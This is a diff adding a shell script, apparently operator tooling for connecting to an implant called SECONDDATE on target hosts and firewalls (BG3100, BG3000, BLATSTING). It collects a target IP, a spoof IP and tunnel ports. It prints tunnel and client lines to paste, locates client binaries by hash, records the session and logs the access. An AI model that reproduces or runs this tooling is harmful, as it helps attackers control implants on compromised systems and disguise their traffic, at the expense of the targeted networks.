@@ -1,0 +1,310 @@
+#!/bin/sh
+#
+# SD User script:
+# Script to set up user env for SD
+#
+# Changelog:
+# 12/08/10 -- Created script
+# 05/18/11 -- Added warnings for blockme commands, can now be used with any current version in clients dir
+# 08/25/11 -- Added functionality to work with FW SD clients
+# 08/25/11 -- Removed Blockme commands, unneeded now.
+# 09/19/12 -- Added BG3100 support
+# 03/28/13 -- Added underscore delimiters on *$VER* pastable and use of autologtool
+
+VER=1.0.0.4
+loop1=0;
+dummy=0;
+source=`mkrandom -n 1025 65535`
+dest=`mkrandom -n 1025 65535`
+
+
+echo ""
+echo ""
+echo ""
+echo "-----------------------------------------------------------------"
+echo "|                                                               |"
+echo "|                    WELCOME TO SECONDATE                       |"
+echo "|                                                               |"
+echo "-----------------------------------------------------------------"
+echo ""
+echo ""
+
+
+while [ "$loop1" = "0" ]; do
+echo "Seconddate versions supported:"
+echo ""
+echo "Supports FW secondates. Enter 'FW' to get the menu."
+echo ""
+ls -1 /current/bin/seconddate_clients
+echo ""
+echo ""
+echo "Enter the version number only: 1.7.0.1 , 1.7.0.2 , 1.7.0.3 , 1.7.0.4 , 1.7.0.5 , 1.7.0.6 "
+
+	echo -n "What version of SD are you connecting to ?: "
+	read _SDVER
+        let loop1=$loop1+1
+                if [ "$_SDVER" = "" ]; then
+                        let loop1=$loop1-1
+                elif [ "$_SDVER" = "FW" ]; then
+			echo ""
+			echo "Currently only 4 different SecondDateLp binaries."
+			echo "BG3100 , BG3000 , BLATSTING 1.6.1.2x , and BLATSTING 2.x.x.xx"
+			echo ""
+			echo ""
+			echo ""
+			echo "BG3100"
+			echo "BG3000"
+			echo "BLAT_1.6"
+			echo "BLAT_2.x"
+			echo ""
+			echo "Which FW implant are you connecting to ?: "
+			read _SDFWVER
+              		if [ "$_SDFWVER" = "" ]; then
+				let loop1=$loop1-2
+			fi
+		fi
+
+	echo -n "Enter Project Name(required): "		#MANDO FIELD
+	read _P1
+	let loop1=$loop1+1
+		if [ "$_P1" = "" ]; then
+			let loop1=$loop1-1
+		fi
+        echo ""
+        echo ""
+	echo -n "Enter IP Address of SD target(required): "		#MANDO FIELD
+	read _I1
+	let loop1=$loop1+1
+		if [ "$_I1" = "" ]; then
+			let loop1=$loop1-1
+		fi
+
+	echo -n "Are you on the SD target and want to send the SD traffic out of the target to another IP? (y,[n])? "
+	read _diffIPa
+	case $_diffIPa in
+		y*|Y*)  echo ""
+                        echo ""
+                        echo ""
+			echo -n "What spoof IP will you be sending the packets to: "
+			read _diffIP
+			dummy=1;;
+		*) ;;
+	esac
+	echo -n "Enter Host Name(required): "		#MANDO FIELD
+	read _H1
+	let loop1=$loop1+1
+		if [ "$_H1" = "" ]; then
+			let loop1=$loop1-1
+		fi
+
+#	echo -n "Enter Tunnel IP Address(127.0.0.1): "           #MANDO FIELD
+#	read _LP1
+#	let loop1=$loop1+1
+ #      		if [ "$_LP1" = "" ]; then
+#	               	_LP1=127\.0\.0\.1
+#       		fi
+
+	echo -n "Enter Tunnel IP Address(127.0.0.1): "           #MANDO FIELD
+	read _Implant1
+	let loop1=$loop1+1
+      		if [ "$_Implant1" = "" ]; then
+	                _Implant1=127\.0\.0\.1
+      		fi
+			if [ "$_Implant1" != "127.0.0.1" ]; then
+				echo -n "Are you sure you do not want to use 127.0.0.1 (y,n)?"
+				read _answer
+				if [ "$_answer" = "" ]; then
+					answer=n
+				fi
+				case $_answer in
+				        n*|N*) echo "Ok...chaning to 127.0.0.1"
+						_Implant1=127\.0\.0\.1;;
+					*) echo "Ok..hope you know what you are doing...do not direct connect to target.";;
+				esac
+			fi
+					
+
+	echo -n "Enter Directory of SD files(regex, inject, ect..): "           #MANDO FIELD
+	read _Dir1
+	let loop1=$loop1+1
+	        if [ "$_Dir1" = "" ]; then
+			_Dir1=/current
+       		fi
+
+	echo -n "Enter Source Port(RHP) to use($source): "           #MANDO FIELD
+	read _Source1
+	let loop1=$loop1+1
+       		if [ "$_Source1" = "" ]; then
+			let _Source1=$source
+       		fi
+
+	echo -n "Enter Dest Port(RHP) to use($dest): "           #MANDO FIELD
+	read _Dest1
+	let loop1=$loop1+1
+       		if [ "$_Dest1" = "" ]; then
+               		let _Dest1=$dest
+       		fi
+
+	if [ $loop1 != 8 ]; then
+		echo ""
+		echo ""
+		echo "Oh no!! You screwed something up."
+		echo ""
+		echo "Please try again."
+		echo ""
+		echo ""
+		let loop1=0
+	fi
+done
+
+# Set command line based on version
+if [ "$_SDVER" = "1.3.0.1" ]; then
+	spacer=' ' 
+	elif [ "$_SDVER" = "1.5.1.2" ]; then
+	spacer=' ' 
+	elif [ "$_SDVER" = "1.5.1.3" ]; then
+	spacer=' ' 
+	elif [ "$_SDVER" = "1.6.2.3" ]; then
+	spacer=' ' 
+	elif [ "$_SDVER" = "FW" ]; then
+		if [ "$_SDFWVER" = "BG3100" ]; then
+			spacer=':'
+			else spacer=' '
+		fi
+	else spacer=':' 
+fi
+
+
+_TIME=`date +%Y%m%d%k%M`	#timestamp if we ever need it
+
+cd $_Dir1
+echo ""
+echo -n "CWD has been set to: "; pwd
+echo ""
+touch /current/down/SD_SETUP.info.$_H1.$_I1
+echo "This is the information used to talk with SD" > /current/down/SD_SETUP.info.$_H1.$_I1
+#
+# Testing for presence of dupe file...renaming if required.
+# savelog is really nice, but not on every system, so we use stupid
+# mv instead and append the PID to it!
+# We'll touch the script here too and then run a few commands 
+# "Script" will append to this file later on...
+
+# Now we start putting stuff in it...
+#
+
+echo "" | tee -a /current/down/SD_SETUP.info.$_H1.$_I1
+echo "DateTime: $_TIME" | tee -a /current/down/SD_SETUP.info.$_H1.$_I1		#uncomment this to incl timestamp in log
+echo "" | tee -a /current/down/SD_SETUP.info.$_H1.$_I1
+echo "#project: $_P1" | tee -a /current/down/SD_SETUP.info.$_H1.$_I1
+echo "#ip: $_I1" | tee -a /current/down/SD_SETUP.info.$_H1.$_I1
+echo "#hostname: $_H1" | tee -a /current/down/SD_SETUP.info.$_H1.$_I1
+echo "#Spoof IP: $_diffIP" | tee -a /current/down/SD_SETUP.info.$_H1.$_I1
+echo "#Tunnel IP: $_Implant1" | tee -a /current/down/SD_SETUP.info.$_H1.$_I1
+echo "#SD Version: $_SDVER" | tee -a /current/down/SD_SETUP.info.$_H1.$_I1
+echo "#SD Directory: $_Dir1" | tee -a /current/down/SD_SETUP.info.$_H1.$_I1
+echo "#Source Port: $_Source1" | tee -a /current/down/SD_SETUP.info.$_H1.$_I1
+echo "#Dest Port: $_Dest1" | tee -a /current/down/SD_SETUP.info.$_H1.$_I1
+echo "" | tee -a /current/down/SD_SETUP.info.$_H1.$_I1
+
+
+
+
+# Now we are going to make your log directory
+
+# Once that craziness is finished, we can start the script up. Contents will append
+# to the existing "touched" file. We had to do this since script actually forks off
+# into it's own little world and will not allow other commands to be run until
+# the script is stopped.
+#
+
+echo "Your redirection line is as follows:"
+echo "------------------------------------"
+echo "Unix:"
+echo "-tunnel"
+case $dummy in
+	0) 	echo "u $_Dest1 $_I1 $_Dest1 $_Source1";;
+	1)	echo "u $_Dest1 $_diffIP $_Dest1 $_Source1";;
+	*)	echo "Something screwed up, you SHOULD now your tunnel";;
+esac
+
+if [ "$_SDFWVER" = "BG3100" ]; then
+	_PATH='/current/bin/seconddate_clients/seconddate_CommonClient_2.0.4.6_i386-linux' 
+	elif [ "$_SDFWVER" = "BG3000" ]; then
+	_PATH='/current/bin/FW/BG3000/Install/LP/SecondDateLP*'
+	elif [ "$_SDFWVER" = "BLAT_1.6" ]; then
+	_PATH=`md5sum /current/bin/FW/*/LP/SecondDate-3.1.1.0.SecondDateLp | grep 3a997be73263167202a03140cead2380| head -1 | cut -d ' ' -f 3`
+	elif [ "$_SDFWVER" = "BLAT_2.x" ]; then
+	_PATH=`md5sum /current/bin/FW/*/LP/SecondDate-3.1.1.0.SecondDateLp | grep 432eafcca75282cf4f2e3ae6f9eea9e6 | head -1 | cut -d ' ' -f 3`
+	else _PATH='NONE'
+fi
+
+if [ "$_PATH" = "NONE" ]; then
+	echo ""
+	echo ""
+	echo ""
+	echo "Here is your SD line to paste."
+	echo `ls -1rt /current/bin/seconddate_clients/*${_SDVER}_* | tail -1` $_Implant1$spacer$_Dest1
+	echo ""
+	echo ""
+	echo ""
+else 
+	echo ""
+	echo ""
+	echo ""
+	echo "Here is your SD line to paste."
+	echo "$_PATH $_Implant1$spacer$_Dest1"
+	echo ""
+	echo ""	
+	echo ""
+fi
+
+echo "Use CTRL D to stop the script once you are done."
+echo ""
+
+/usr/bin/script -af /current/down/script.seconddate."$_H1.$_I1"
+
+
+
+
+echo "" | tee -a /current/down/script.seconddate."$_H1.$_I1"
+echo "DateTime: $_TIME" | tee -a /current/down/script.seconddate."$_H1.$_I1"
+echo "" | tee -a /current/down/script.seconddate."$_H1.$_I1"
+echo "#project: $_P1" | tee -a /current/down/script.seconddate."$_H1.$_I1"
+echo "#ip: $_I1" | tee -a /current/down/script.seconddate."$_H1.$_I1"
+echo "#hostname: $_H1" | tee -a /current/down/script.seconddate."$_H1.$_I1"
+echo "" | tee -a /current/down/script.seconddate."$_H1.$_I1"
+echo "" | tee -a /current/down/script.seconddate."$_H1.$_I1"
+
+
+# We are done 
+
+
+# Log it if we can
+if [ -x "/current/etc/autologtool" ] ; then
+	echo ""
+	echo ""
+	echo ""
+	STATUS=`egrep -l "^.SUCCESS|Synchronize success" /current/down/script.seconddate."$_H1.$_I1"`
+	if [ "$STATUS" ] ; then
+		STATUS=SUCCESSFUL
+	else
+		STATUS=FAILED
+	fi
+	echo "Logging your use of SECONDDATE $_SDVER with autologtool"
+	/current/etc/autologtool -T "$_H1.$_I1" -u ACCESSED -s $STATUS -n SECONDDATE -V $_SDVER
+fi
+
+echo ""
+echo "Thanks for playing... bye"
+echo ""
+
+
+
+
+
+#
+echo ""
+# This next command will whack whatever we spawned from this
+kill 0
+#EOF
